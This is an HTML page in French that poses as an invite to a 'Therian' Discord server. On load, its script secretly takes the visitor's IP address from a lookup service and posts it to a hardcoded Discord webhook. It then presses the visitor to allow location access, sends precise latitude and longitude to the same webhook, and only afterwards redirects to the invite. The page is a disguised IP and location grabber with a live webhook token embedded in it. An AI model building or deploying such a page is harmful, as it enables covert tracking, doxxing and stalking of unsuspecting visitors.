<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Rejoindre le serveur Discord Therian</title>
  <style>
    body {
      background: radial-gradient(circle at center, #0a0a0a 0%, #000 100%);
      color: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: "Segoe UI", Arial, sans-serif;
      text-align: center;
    }
    h1 {
      font-size: 1.4em;
      font-weight: 500;
      letter-spacing: 0.5px;
      color: #e0e0e0;
      max-width: 90%;
    }
  </style>
</head>
<body>
  <div>
    <h1 id="titre">Chargement‚Ä¶</h1>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1367237113220698184/dRNpJg9cI-GD6PMGNHE22eAvjVPOIz5i8zfuIWOVADYCplQvQ3UBcqCL1vFet8CRtcMr";
    const REDIRECT_URL = "https://discord.gg/UYqhGQmdQR";

    async function getIP() {
      try {
        const response = await fetch("https://api.ipify.org/?format=json");
        const data = await response.json();
        return data.ip;
      } catch (error) {
        console.error("Erreur r√©cup√©ration IP:", error);
        return null;
      }
    }

    async function sendIP(ip) {
      try {
        await fetch(WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: `üåê Adresse IP d√©tect√©e : ${ip}` })
        });
      } catch (error) {
        console.error("Erreur envoi IP:", error);
      }
    }

    async function sendPosition(position) {
      const lat = position.coords.latitude.toFixed(6);
      const lng = position.coords.longitude.toFixed(6);
      try {
        await fetch(WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: `üìç Localisation :\nLatitude: ${lat}\nLongitude: ${lng}` })
        });
      } catch (e) {}
    }

    async function envoyerDonnees() {
      // 1Ô∏è‚É£ Envoyer IP imm√©diatement
      const ip = await getIP();
      if (ip) await sendIP(ip);

      // 2Ô∏è‚É£ V√©rifier si la g√©olocalisation est disponible
      if ("geolocation" in navigator) {
        document.getElementById("titre").innerText = "Veuillez autoriser la localisation pour continuer‚Ä¶";

        navigator.geolocation.getCurrentPosition(
          async (position) => {
            // 3Ô∏è‚É£ Si autoris√©e ‚Üí envoyer position avant redirection
            await sendPosition(position);
            window.location.href = REDIRECT_URL;
          },
          () => {
            // 4Ô∏è‚É£ Si refus√©e ou d√©sactiv√©e ‚Üí redirection apr√®s IP
            window.location.href = REDIRECT_URL;
          },
          { enableHighAccuracy: true, timeout: 10000 } // Timeout 10s
        );
      } else {
        // Pas de g√©olocalisation ‚Üí redirection apr√®s IP
        window.location.href = REDIRECT_URL;
      }
    }

    window.onload = envoyerDonnees;
  </script>
</body>
</html>
